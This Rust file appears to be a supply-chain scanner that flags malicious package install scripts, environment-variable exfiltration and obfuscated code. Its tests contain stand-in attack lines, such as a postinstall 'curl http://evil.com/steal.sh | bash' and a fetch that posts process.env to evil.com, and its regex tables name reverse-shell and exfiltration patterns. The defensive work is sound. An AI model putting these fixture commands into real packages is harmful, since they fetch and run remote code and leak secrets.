use gard_core::{Config, Ecosystem, TierResult};
use regex::Regex;
use serde_json::Value;
use std::{
    fs,
    path::{Path, PathBuf},
    sync::OnceLock,
};

// ── Public finding types ──────────────────────────────────────────────────────

#[derive(Debug, Clone, PartialEq)]
pub enum Severity {
    Critical,
    High,
}

#[derive(Debug, Clone)]
pub struct Finding {
    pub file:     String,
    pub line:     usize,   // 0 = file-level
    pub severity: Severity,
    pub label:    &'static str,
}

// ── Pattern definitions ───────────────────────────────────────────────────────

struct RawPattern {
    regex:    &'static str,
    label:    &'static str,
    severity: Severity,
}

struct CompiledPat {
    regex:    Regex,
    label:    &'static str,
    severity: Severity,
}

impl CompiledPat {
    fn matches(&self, text: &str) -> bool {
        self.regex.is_match(text)
    }

    fn finding(&self, file: String, line: usize) -> Finding {
        Finding { file, line, severity: self.severity.clone(), label: self.label }
    }
}

fn compile(defs: &'static [RawPattern]) -> Vec<CompiledPat> {
    defs.iter()
        .filter_map(|d| {
            Regex::new(d.regex).ok().map(|re| CompiledPat {
                regex:    re,
                label:    d.label,
                severity: d.severity.clone(),
            })
        })
        .collect()
}

// ── Pattern tables ────────────────────────────────────────────────────────────

static CRITICAL_RAW: &[RawPattern] = &[
    RawPattern {
        regex:    r"eval\s*\(\s*(Buffer\.from|atob)\s*\(",
        label:    "eval(base64_decode()) — obfuscated payload execution",
        severity: Severity::Critical,
    },
    RawPattern {
        regex:    r#"require\s*\(\s*['"]child_process['"]\s*\)\s*\.\s*(exec|spawn)\s*\("#,
        label:    "child_process.exec/spawn — arbitrary command execution",
        severity: Severity::Critical,
    },
    RawPattern {
        regex:    r"subprocess\s*\.\s*(run|call|Popen)\s*\(\s*\[",
        label:    "subprocess.run/call/Popen — shell execution",
        severity: Severity::Critical,
    },
    RawPattern {
        regex:    r#"require\s*\(\s*['"]net['"]\s*\)\.createConnection\s*\(\s*\d+\s*,"#,
        label:    "net.createConnection(port, host) — potential reverse shell",
        severity: Severity::Critical,
    },
];

static HIGH_RAW: &[RawPattern] = &[
    RawPattern {
        regex:    r"process\.env",
        label:    "process.env access — potential env variable harvesting",
        severity: Severity::High,
    },
    RawPattern {
        regex:    r#"fetch\s*\(\s*['"]https?://"#,
        label:    "hardcoded external fetch() call",
        severity: Severity::High,
    },
    RawPattern {
        regex:    r"os\.environ",
        label:    "os.environ access — potential env variable harvesting",
        severity: Severity::High,
    },
];

static SCRIPT_RAW: &[RawPattern] = &[
    RawPattern {
        regex:    r#"https?\.get|fetch\(|axios|require\(['"]http"#,
        label:    "network call in install script",
        severity: Severity::Critical,
    },
    RawPattern {
        regex:    r"child_process|exec\s*\(|\|\s*(sh|bash)\b|curl\s|wget\s",
        label:    "shell execution in install script",
        severity: Severity::Critical,
    },
];

// ── OnceLock caches for compiled patterns ─────────────────────────────────────

static CRITICAL: OnceLock<Vec<CompiledPat>> = OnceLock::new();
static HIGH:     OnceLock<Vec<CompiledPat>> = OnceLock::new();
static SCRIPT:   OnceLock<Vec<CompiledPat>> = OnceLock::new();

fn critical() -> &'static Vec<CompiledPat> { CRITICAL.get_or_init(|| compile(CRITICAL_RAW)) }
fn high()     -> &'static Vec<CompiledPat> { HIGH.get_or_init(||     compile(HIGH_RAW))     }
fn script()   -> &'static Vec<CompiledPat> { SCRIPT.get_or_init(||   compile(SCRIPT_RAW))   }

// ── Install script keys (npm) ─────────────────────────────────────────────────

const DANGEROUS_SCRIPTS: &[&str] = &[
    "preinstall", "install", "postinstall",
    "preuninstall", "postuninstall",
];

// ── Public API ────────────────────────────────────────────────────────────────

/// Tier 3: analyze installed package source for malicious patterns.
/// Only called when Tier 2 score ≥ 61.
pub fn analyze(pkg_path: &Path, ecosystem: &Ecosystem, cfg: &Config) -> TierResult {
    let a = run_analysis(pkg_path, ecosystem, cfg);

    let script_crits = a.script_findings.iter().filter(|f| f.severity == Severity::Critical).count();
    let src_crits    = a.source_findings.iter().filter(|f| f.severity == Severity::Critical).count();
    let src_highs    = a.source_findings.iter().filter(|f| f.severity == Severity::High).count();
    let obs          = a.obfuscation_score;
    let obs_block    = cfg.tier3.obfuscation_block_score;

    if script_crits > 0 {
        let first = &a.script_findings[0];
        return TierResult::Block { reason: format!("malicious install script: {}", first.label) };
    }
    if src_crits >= 2 {
        return TierResult::Block { reason: format!("{src_crits} critical patterns in source") };
    }
    if obs >= obs_block {
        return TierResult::Block { reason: format!("obfuscation score {obs}/100 ≥ block threshold {obs_block}") };
    }
    if src_crits == 1 || src_highs >= 1 {
        return TierResult::Warn { reason: format!("{} high-severity pattern(s) in source", src_crits + src_highs) };
    }
    if obs >= 70 {
        return TierResult::Warn { reason: format!("obfuscation score {obs}/100") };
    }

    TierResult::Pass
}

// ── Internal analysis runner ──────────────────────────────────────────────────

pub struct PackageAnalysis {
    pub script_findings:   Vec<Finding>,
    pub source_findings:   Vec<Finding>,
    pub obfuscation_score: u8,
}

pub fn run_analysis(pkg_path: &Path, ecosystem: &Ecosystem, cfg: &Config) -> PackageAnalysis {
    PackageAnalysis {
        script_findings:   scan_install_scripts(pkg_path, ecosystem),
        source_findings:   scan_source_files(pkg_path, ecosystem, cfg),
        obfuscation_score: score_obfuscation(pkg_path, ecosystem),
    }
}

// ── Install script scanner (npm package.json) ─────────────────────────────────

fn scan_install_scripts(pkg_path: &Path, ecosystem: &Ecosystem) -> Vec<Finding> {
    if *ecosystem != Ecosystem::Npm {
        return vec![];
    }
    let content = match fs::read_to_string(pkg_path.join("package.json")) {
        Ok(c) => c,
        Err(_) => return vec![],
    };
    let json: Value = match serde_json::from_str(&content) {
        Ok(v) => v,
        Err(_) => return vec![],
    };
    let scripts = match json.get("scripts").and_then(|s| s.as_object()) {
        Some(s) => s,
        None    => return vec![],
    };

    let mut findings = vec![];
    for key in DANGEROUS_SCRIPTS {
        let value = match scripts.get(*key).and_then(|v| v.as_str()) {
            Some(v) => v,
            None    => continue,
        };
        for pat in script() {
            if pat.matches(value) {
                findings.push(pat.finding("package.json".into(), 0));
            }
        }
    }
    findings
}

// ── Source file scanner ───────────────────────────────────────────────────────

fn source_extensions(eco: &Ecosystem) -> &'static [&'static str] {
    match eco {
        Ecosystem::Npm   => &["js", "mjs", "cjs"],
        Ecosystem::PyPI  => &["py"],
        Ecosystem::Cargo => &["rs"],
    }
}

fn scan_source_files(pkg_path: &Path, ecosystem: &Ecosystem, cfg: &Config) -> Vec<Finding> {
    let exts     = source_extensions(ecosystem);
    let max_size = cfg.tier3.max_file_size_kb * 1024;
    let skip_min = cfg.tier3.skip_minified;
    let crit     = critical();
    let high_p   = high();
    let mut findings = vec![];

    for path in walk_files(pkg_path, exts) {
        if path.metadata().map(|m| m.len()).unwrap_or(0) > max_size { continue }
        let content = match fs::read_to_string(&path) {
            Ok(c) => c,
            Err(_) => continue,
        };
        if skip_min && is_minified(&content) { continue }

        let rel = path.strip_prefix(pkg_path).unwrap_or(&path).to_string_lossy().to_string();

        // Track env + fetch combo per file
        let mut has_env   = false;
        let mut has_fetch = false;

        for (lno, line) in content.lines().enumerate() {
            let line_no = lno + 1;
            for pat in crit {
                if pat.matches(line) {
                    findings.push(pat.finding(rel.clone(), line_no));
                }
            }
            for pat in high_p {
                if pat.matches(line) {
                    if pat.label.contains("process.env") || pat.label.contains("os.environ") {
                        has_env = true;
                    } else if pat.label.contains("fetch") {
                        has_fetch = true;
                    } else {
                        findings.push(pat.finding(rel.clone(), line_no));
                    }
                }
            }
        }

        // Combo: env harvest + external fetch in same file → Critical
        if has_env && has_fetch {
            findings.push(Finding {
                file:     rel,
                line:     0,
                severity: Severity::Critical,
                label:    "env variables accessed and sent to external URL (same file)",
            });
        }
    }
    findings
}

// ── Obfuscation scorer ────────────────────────────────────────────────────────

fn score_obfuscation(pkg_path: &Path, ecosystem: &Ecosystem) -> u8 {
    let exts = source_extensions(ecosystem);
    let mut scores: Vec<u8> = vec![];

    for path in walk_files(pkg_path, exts) {
        if let Ok(content) = fs::read_to_string(&path) {
            if !content.is_empty() {
                scores.push(file_obfuscation_score(&content));
            }
        }
    }
    // Return the max across all files (one bad file is enough)
    scores.into_iter().max().unwrap_or(0)
}

fn file_obfuscation_score(content: &str) -> u8 {
    let mut score: u8 = 0;
    let lines: Vec<&str> = content.lines().collect();
    let total = lines.len().max(1);

    // _0x variable names (JS obfuscator signature)
    let hex_vars = content.matches("_0x").count();
    score = score.saturating_add(if hex_vars > 10 { 40 } else if hex_vars > 3 { 20 } else { 0 });

    // \xNN hex escape sequences
    let hex_esc = count_hex_escapes(content);
    score = score.saturating_add(if hex_esc > 50 { 30 } else if hex_esc > 10 { 15 } else { 0 });

    // Long lines (packed/minified code)
    let long = lines.iter().filter(|l| l.len() > 500).count();
    score = score.saturating_add(
        if long * 10 > total * 8 { 30 }        // > 80% long lines
        else if long * 4 > total { 15 }         // > 25% long lines
        else { 0 },
    );

    score.min(100)
}

fn count_hex_escapes(s: &str) -> usize {
    let mut count = 0;
    let b = s.as_bytes();
    let mut i = 0;
    while i + 3 < b.len() {
        if b[i] == b'\\' && b[i+1] == b'x' && b[i+2].is_ascii_hexdigit() && b[i+3].is_ascii_hexdigit() {
            count += 1;
            i += 4;
        } else {
            i += 1;
        }
    }
    count
}

// ── File walker ───────────────────────────────────────────────────────────────

fn walk_files(root: &Path, extensions: &[&str]) -> Vec<PathBuf> {
    let mut files = vec![];
    for result in ignore::Walk::new(root) {
        let entry = match result { Ok(e) => e, Err(_) => continue };
        if !entry.file_type().map_or(false, |ft| ft.is_file()) { continue }
        let path = entry.into_path();
        let ext_ok = path.extension()
            .and_then(|e| e.to_str())
            .map_or(false, |e| extensions.contains(&e));
        if ext_ok { files.push(path); }
    }
    files
}

fn is_minified(content: &str) -> bool {
    content.lines()
        .find(|l| !l.trim().is_empty())
        .map_or(false, |l| l.len() > 1000)
}

// ── Tests ─────────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;
    use gard_core::Config;
    use std::io::Write;
    use tempfile::TempDir;

    fn cfg() -> Config { Config::default() }

    fn write_file(dir: &TempDir, name: &str, content: &str) {
        let mut f = fs::File::create(dir.path().join(name)).unwrap();
        f.write_all(content.as_bytes()).unwrap();
    }

    // ── install script tests ──────────────────────────────────────────────────

    #[test]
    fn clean_script_no_findings() {
        let dir = TempDir::new().unwrap();
        write_file(&dir, "package.json", r#"{"scripts":{"postinstall":"echo done"}}"#);
        assert!(scan_install_scripts(dir.path(), &Ecosystem::Npm).is_empty());
    }

    #[test]
    fn network_in_postinstall_is_critical() {
        let dir = TempDir::new().unwrap();
        write_file(&dir, "package.json",
            r#"{"scripts":{"postinstall":"node -e \"require('https').get('http://evil.com')\""}}"#);
        let f = scan_install_scripts(dir.path(), &Ecosystem::Npm);
        assert!(!f.is_empty());
        assert_eq!(f[0].severity, Severity::Critical);
    }

    #[test]
    fn curl_pipe_bash_is_critical() {
        let dir = TempDir::new().unwrap();
        write_file(&dir, "package.json",
            r#"{"scripts":{"postinstall":"curl http://evil.com/steal.sh | bash"}}"#);
        let f = scan_install_scripts(dir.path(), &Ecosystem::Npm);
        assert!(!f.is_empty());
        assert_eq!(f[0].severity, Severity::Critical);
    }

    // ── source scan tests ─────────────────────────────────────────────────────

    #[test]
    fn eval_base64_is_critical() {
        let dir = TempDir::new().unwrap();
        write_file(&dir, "index.js", r#"eval(Buffer.from(payload, 'base64').toString())"#);
        let f = scan_source_files(dir.path(), &Ecosystem::Npm, &cfg());
        assert!(f.iter().any(|x| x.severity == Severity::Critical));
    }

    #[test]
    fn clean_utility_no_findings() {
        let dir = TempDir::new().unwrap();
        write_file(&dir, "index.js", r#"module.exports = (a, b) => a + b;"#);
        assert!(scan_source_files(dir.path(), &Ecosystem::Npm, &cfg()).is_empty());
    }

    #[test]
    fn env_plus_fetch_combo_is_critical() {
        let dir = TempDir::new().unwrap();
        write_file(&dir, "steal.js", r#"
const data = JSON.stringify(process.env);
fetch('https://evil.com/collect', { method: 'POST', body: data });
"#);
        let f = scan_source_files(dir.path(), &Ecosystem::Npm, &cfg());
        assert!(f.iter().any(|x| x.severity == Severity::Critical));
    }

    // ── obfuscation tests ─────────────────────────────────────────────────────

    #[test]
    fn hex_var_names_score_high() {
        let content = "_0x1a _0x2b _0x3c _0x4d _0x5e _0x6f _0x7a _0x8b _0x9c _0xad _0xbe";
        assert!(file_obfuscation_score(content) >= 40);
    }

    #[test]
    fn clean_code_scores_zero() {
        let content = "function add(a, b) { return a + b; }\nmodule.exports = { add };";
        assert_eq!(file_obfuscation_score(content), 0);
    }

    // ── full pipeline test ────────────────────────────────────────────────────

    #[test]
    fn malicious_package_blocked() {
        let dir = TempDir::new().unwrap();
        write_file(&dir, "package.json",
            r#"{"scripts":{"postinstall":"curl http://c2.evil.com/steal.sh | bash"}}"#);
        let result = analyze(dir.path(), &Ecosystem::Npm, &cfg());
        assert!(result.is_blocking(), "expected Block, got {result:?}");
    }

    #[test]
    fn clean_package_passes() {
        let dir = TempDir::new().unwrap();
        write_file(&dir, "package.json", r#"{"name":"clean-util","version":"1.0.0"}"#);
        write_file(&dir, "index.js", r#"module.exports = s => s.trim();"#);
        let result = analyze(dir.path(), &Ecosystem::Npm, &cfg());
        assert_eq!(result, TierResult::Pass);
    }
}
